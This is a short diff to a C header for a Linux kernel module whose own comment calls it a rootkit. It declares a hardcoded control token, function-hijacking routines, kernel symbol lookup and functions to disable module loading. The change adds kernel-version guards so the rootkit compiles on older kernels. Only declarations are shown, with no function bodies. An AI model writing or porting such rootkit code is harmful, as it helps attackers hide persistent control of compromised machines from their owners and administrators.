@@ -5,7 +5,11 @@
 #include <linux/slab.h>
 #include <linux/list.h>
 #include <linux/fs.h>
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
 #include <generated/autoconf.h>
+#else
+#include <linux/autoconf.h>
+#endif
 
 #define AUTH_TOKEN 0x12345678   // Authentication token for rootkit control
 #define __DEBUG__ 1             // General debugging statements
@@ -48,7 +52,9 @@ void hijack_pause(void *target);
 void hijack_resume(void *target);
 void hijack_stop(void *target);
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 30)
 unsigned long get_symbol(char *name);
+#endif
 
 void disable_module_loading(void);
 void enable_module_loading(void);
